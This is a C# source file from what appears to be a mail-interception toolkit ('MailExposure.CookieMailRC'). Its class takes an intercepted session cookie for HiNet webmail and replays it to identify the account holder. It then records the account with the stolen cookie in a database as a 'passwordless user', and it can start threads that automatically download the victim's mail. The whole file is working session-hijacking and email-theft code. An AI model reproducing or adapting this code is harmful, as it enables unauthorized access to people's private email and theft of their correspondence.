using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Text.RegularExpressions;
using System.IO;
using System.Net;
using System.Threading;

namespace MailExposure.CookieMailRC
{
    class FilterHinetmail:DisplaceNew
    {
        // Fields
        private bool Auto;
        private string cookieRemarks;
        private string nameTemp;
        private string ower;
        private string strCookie;
        private string urls;
        private string userListNames;
        private string UserName;
        private string userType;

        // Methods
        public FilterHinetmail(string url, string strCookie, string interceptTime, string userList, bool Auto, string cookieRemarks)
        {
            this.urls = "";
            this.UserName = "";
            this.nameTemp = "";
            this.strCookie = "";
            this.userListNames = "";
            this.cookieRemarks = "";
            this.userType = "'无密用户'";
            this.ower = "'capHinet'";
            base.url = url;
            base.cookie = strCookie;
            this.strCookie = strCookie;
            base.interceptTime = interceptTime;
            this.userListNames = userList;
            this.Auto = Auto;
            this.cookieRemarks = cookieRemarks;

        }
        public void loginUser()
        {
            base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
            base.streamControl = true;
            base.MyStringBuilder = this.Request(base.url);
            base.MyStringBuilder.ToString();
            Regex.Match(base.MyStringBuilder.ToString(), "<title>([^<]*)</title>").Groups[1].Value.Trim();
            this.nameTemp = base.putstr(base.MyStringBuilder.ToString(), "<span class=\"txt-13px\">", "</span>", 0);
            if (this.nameTemp.IndexOf("@") != -1)
            {
                this.UserName = this.nameTemp;
            }
            else if (base.MyStringBuilder.ToString().IndexOf("(01402)") != -1)
            {
                base.ShowMessage("身份验证错误，为确保您使用网络的安全，请重新登入");
            }
            else if (base.MyStringBuilder.ToString().IndexOf("(01406)") != -1)
            {
                base.ShowMessage("您已经执行登出或连线逾时，请重新登入");
            }
            else if (base.MyStringBuilder.ToString().IndexOf("(01604)") != -1)
            {
                base.ShowMessage("由於網頁郵件服務不提供同一帳號、同時間在不同視窗登入，若有重複登入、不正常登出(直接關閉視窗或是因系統錯誤而離開)之情形，請重新登入");
            }
            if ((this.UserName != "") && (this.UserName != null))
            {
                if (this.urls == "")
                {
                    this.urls = base.url;
                }
                string str = "'" + this.UserName + "'";
                string str2 = "'" + this.strCookie + "'";
                string str3 = "'HN'";
                string str4 = "'" + base.interceptTime + "'";
                string str5 = "'是'";
                if (this.cookieRemarks.Length > 0)
                {
                    this.ower = "'" + this.cookieRemarks + "'";
                }
                else
                {
                    this.ower = "'" + DateTime.Now.ToString("yyyMMdd") + "'";
                }
                string str6 = this.Auto ? "1" : "0";
                str6 = "'" + str6 + "'";
                this.userListNames = "'" + this.userListNames + "'";
                string strSql = "insert into users(属主,用户名,服务器,服务器地址,方向,邮件地址,验证登陆,时间限制,用户类型,全部接收,用户列表,自动收取) values(" + this.ower + "," + str + "," + str3 + "," + str3 + ",'capHinet','" + this.urls + "'," + str2 + "," + str4 + "," + this.userType + "," + str5 + "," + this.userListNames + "," + str6 + ")";
                string str8 = "select count(*)from users where 服务器地址=" + str3 + "and 用户名=" + str + "and 用户类型=" + this.userType;
                string str9 = "update users set 邮件地址='" + base.url + "',验证登陆=" + str2 + " where 服务器地址=" + str3 + "and 用户名=" + str + "and 用户类型=" + this.userType;
                if (Convert.ToInt32(GlobalValue.mainForm.ExecuteSQL(str8)) <= 0)
                {
                    GlobalValue.mainForm.ExecuteSQL(strSql);
                    GlobalValue.mainForm.listBoxView.Items.Add("添加用户:" + this.UserName);
                    GlobalValue.mainForm.listBoxView.Items.Add("[" + this.UserName + "]: 结束过滤");
                    GlobalValue.mainForm.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
                    foreach (TreeNode node2 in GlobalValue.mainForm.treeViewUsers.Nodes[0].Nodes)
                    {
                        if (node2.Text == this.userListNames.Trim(new char[] { '\'' }))
                        {
                            GlobalValue.mainForm.treeViewUsers.SelectedNode = node2;
                        }
                    }
                    if (this.Auto)
                    {
                        new BeginReceiveThreads(1, "HN", "HN", this.UserName, "", this.ower.Trim(new char[] { '\'' }), "capHinet", 0, base.url, this.strCookie, this.userType, this.userListNames.Trim(new char[] { '\'' })).Execute();
                    }
                }
                else
                {
                    str8 = "select 时间限制 from users where 服务器地址=" + str3 + "and 用户名=" + str + "and 用户类型=" + this.userType;
                    DateTime time = DateTime.Parse(GlobalValue.mainForm.ExecuteSQL(str8));
                    if (DateTime.Compare(DateTime.Parse(base.interceptTime), time) > 0)
                    {
                        GlobalValue.mainForm.ExecuteSQL(str9);
                        GlobalValue.mainForm.listBoxView.Items.Add("[" + this.UserName + "]:修改用户!");
                        GlobalValue.mainForm.listBoxView.Items.Add("[" + this.UserName + "]: 结束过滤");
                        GlobalValue.mainForm.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
                        foreach (TreeNode node in GlobalValue.mainForm.treeViewUsers.Nodes[0].Nodes)
                        {
                            if (node.Text == this.userListNames.Trim(new char[] { '\'' }))
                            {
                                GlobalValue.mainForm.treeViewUsers.SelectedNode = node;
                            }
                        }
                        if (this.Auto)
                        {
                            new BeginReceiveThreads(1, "HN", "HN", this.UserName, "", this.ower.Trim(new char[] { '\'' }), "capHinet", 0, base.url, this.strCookie, this.userType, this.userListNames.Trim(new char[] { '\'' })).Execute();
                        }
                    }
                }
            }
            else
            {
                GlobalValue.mainForm.listBoxView.Items.Add("Cookie 可能已失效");
                GlobalValue.mainForm.listBoxView.Items.Add("结束过滤");
                GlobalValue.mainForm.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
            }

        }
        private StringBuilder Request(string url)
        {
            try
            {
                StreamReader reader;
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET";
                request.Accept = "*/*";
                request.AllowAutoRedirect = false;
                request.ServicePoint.Expect100Continue = false;
                request.KeepAlive = true;
                request.UserAgent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)";
                request.ContentType = "application/x-www-form-urlencoded";
                request.Headers.Add("Accept-Language: zh-cn");
                request.Headers.Add("Cookie", base.cookie);
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                WebHeaderCollection headers = response.Headers;
                if (response.Headers["Set-Cookie"] != null)
                {
                    base.cookie = base.cook(response.Headers["Set-Cookie"]);
                }
                if (headers["Content-Type"] != null)
                {
                    string str = "";
                    str = headers["Content-Type"];
                    if (str.IndexOf("charset=") >= 0)
                    {
                        base.charSet = str.Substring(str.IndexOf("charset=") + 8, (str.Length - str.IndexOf("charset=")) - 8);
                    }
                }
                Thread.Sleep(10);
                if (((response.StatusCode == HttpStatusCode.Found) || (response.StatusCode == HttpStatusCode.MovedPermanently)) || ((response.StatusCode == HttpStatusCode.MovedPermanently) || (response.StatusCode == HttpStatusCode.Found)))
                {
                    this.urls = headers["location"];
                    if (this.urls.IndexOf("http") != -1)
                    {
                        this.Request(this.urls);
                    }
                }
                if ((base.charSet == null) || (base.charSet == "-1"))
                {
                    reader = new StreamReader(response.GetResponseStream(), Encoding.Default);
                }
                else
                {
                    reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(base.charSet));
                }
                if (base.streamControl)
                {
                    base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                    for (string str2 = reader.ReadLine(); str2 != null; str2 = reader.ReadLine())
                    {
                        base.MyStringBuilder.Append(str2 + "\r\n");
                        str2 = null;
                    }
                    base.streamControl = false;
                }
                reader.Close();
            }
            catch (Exception exception)
            {
                base.ShowMessage(exception.Message);
            }
            return base.MyStringBuilder;

        }

    }
}
